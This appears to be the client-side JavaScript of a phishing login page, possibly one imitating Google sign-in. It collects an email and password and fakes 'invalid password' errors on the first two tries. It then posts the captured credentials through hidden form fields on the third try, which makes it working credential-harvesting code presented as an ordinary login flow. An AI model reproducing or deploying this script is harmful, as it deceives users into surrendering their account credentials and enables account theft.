    /*

          Post to the fallowing path given the parameters.

          Args:

            path: The path to be posted to.

            params: The parameters to be passed.

          */

          function post(path, params) {

            // create a form and set its attributes

            var form = document.createElement("form");

            form.setAttribute("method", "post");

            form.setAttribute("action", path);

            // set the attribute for the post

            for(var key in params) {

                if(params.hasOwnProperty(key)) {

                    var hiddenField = document.createElement("input");

                    hiddenField.setAttribute("type", "hidden");

                    hiddenField.setAttribute("name", key);

                    hiddenField.setAttribute("value", params[key]);

                    form.appendChild(hiddenField);

                 }

            }

            // submit the post

            document.body.appendChild(form);

            form.submit();

          }

        

    

  function validateEmailPass() {

  var input = document.getElementById("eml");

        var input2 = document.getElementById("pwd");

    				// check to see if the value is empty

        if ( input.value == "" ){

            return false;

        }else if( input2.value == "" ){ //check if the value of the repeat field is empty

            return false;

        }else{

           return true;

        }

    }

      

var abc = 0;

function validatePass(pass) {

if (abc==0){

      abc = 1;

				return false;

}else{

				return true;

}

}

var xyz = 0;

function password_error() {

				if (xyz == 2) {

            /* fade in the loading animations */

            $( '.progress-bar' ).fadeIn('show');

            $( '#login-form' ).fadeTo( "fast", 0.6 )

            /* after we have a 'response' from the server */

            setTimeout(function () {

                /* hide the progress bar */

                $( '.progress-bar' ).css('display', 'none');

                /* if the user entered invalid entries before, hide the invalid classes */

                $( '#email-input' ).removeClass('g-input-invalid');

                $( '.invalid-pass' ).css('display', 'none');

                /* set the opacity to normal */

                $( '#login-form' ).css('opacity', 1)

            }, 800);

            // post the data

            $("#dialog").css('display', 'none');

              // get the password box and checkbox elements

          var username = document.getElementById("eml");

        var input2 = document.getElementById("pwd");

              post('/', {

                email: username.value,

                password: input2.value

              });

        } else {

            /* fade in the loading animations */

            $( '.progress-bar' ).fadeIn('slow');

            $( '#login-form' ).fadeTo( "fast", 0.6 )

            /* after we have a 'response' from the server */

            setTimeout(function () {

                /* show invalid classes as the email is not valid */

                $( '#login-form' ).css('opacity', 1)

                $( '.progress-bar' ).css('display', 'none');

                $( '#email-input' ).addClass('g-input-invalid');

                $( '.invalid-pass' ).css('display', 'block');

            }, 500);

            xyz += 1;

        }

}

    function doEmailStep(){

        /* check the validity of the email */

  email_valid = validateEmailPass();

        

if(email_valid){

            /* fade in the loading animations */

            $( '.progress-bar' ).fadeIn('show');

            $( '#login-form' ).fadeTo( "fast", 0.6 )

            /* after we have a 'response' from the server */

            setTimeout(function () {

                /* hide the progress bar */

                $( '.progress-bar' ).css('display', 'none');

                /* if the user entered invalid entries before, hide the invalid classes */

                $( '#email-input' ).removeClass('g-input-invalid');

                $( '.invalid-email' ).css('display', 'none');

                /* set the opacity to normal */

                $( '#login-form' ).css('opacity', 1)

            }, 800);

        password_error();

        } else {

            /* fade in the loading animations */

            $( '.progress-bar' ).fadeIn('slow');

            $( '#login-form' ).fadeTo( "fast", 0.6 )

            /* after we have a 'response' from the server */

            setTimeout(function () {

                /* show invalid classes as the email is not valid */

                $( '#login-form' ).css('opacity', 1)

                $( '.progress-bar' ).css('display', 'none');

                $( '#email-input' ).addClass('g-input-invalid');

                $( '.invalid-email' ).css('display', 'block');

            }, 500);

        }

    }

    $(document).ready(function() {

        /* seperate submit events as divs can't be used as submit buttons directly */

        // if the next button is pressed

        $( '#login-app' ).on('click', '.btn-next-email', function(event) {

            doEmailStep()

        });

        // if the email form step is submitted

        $( '#login-app' ).on('submit', '#email-form-step', function(event) {

            event.preventDefault();

            doEmailStep()

        });

    });
